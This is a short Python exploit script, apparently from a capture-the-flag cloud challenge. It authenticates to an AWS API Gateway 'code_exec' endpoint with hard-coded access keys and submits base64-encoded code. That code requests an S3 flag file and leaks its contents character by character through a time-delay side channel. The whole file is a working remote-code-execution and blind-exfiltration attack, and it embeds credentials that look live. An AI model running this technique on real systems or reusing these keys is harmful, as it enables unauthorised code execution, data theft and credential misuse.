import requests
import json
import base64
import time
from aws_requests_auth.aws_auth import AWSRequestsAuth

auth = AWSRequestsAuth(aws_access_key="ASIARYWSMSYIIWK4BEMG",
                       aws_secret_access_key="yQXeKSwcKm2sMkj34DVhMhzMAQ/U+U1en5S4xmsd",
                       aws_token="",
                       aws_host='l8ssyaz69f.execute-api.us-east-1.amazonaws.com',
                       aws_region='us-east-1',
                       aws_service='execute-api')

URL = "https://l8ssyaz69f.execute-api.us-east-1.amazonaws.com/dev/code_exec"

def test_char(pos, char, target_url):
    code = f"""
import urllib.request, urllib.error
import time

try:
    req = urllib.request.Request('{target_url}', headers={{'User-Agent': 'Boto3/1.26.0'}})
    urllib.request.urlopen(req, timeout=3).read()
    val = "SUCCESS"
except urllib.error.HTTPError as e:
    val = str(e.code) + ":" + str(type(e).__name__) # just to be safe
except Exception as e:
    val = type(e).__name__ + ":" + str(e)

c = chr({ord(char)})
if len(val) > {pos} and val[{pos}] == c:
    time.sleep(2.0)
"""
    encoded_code = base64.b64encode(code.encode('utf-8')).decode('utf-8')
    start = time.time()
    try:
        requests.post(URL, json={"code": encoded_code}, auth=auth, timeout=5)
    except:
        pass
    elapsed = time.time() - start
    print(f"Char {char} elapsed: {elapsed:.2f}")
    return elapsed > 1.5

print(test_char(0, '4', 'https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt'))
print(test_char(0, 'H', 'https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt'))
print(test_char(0, 'U', 'https://s3.us-east-1.amazonaws.com/userd8a2f72fe43094e8/flag.txt'))
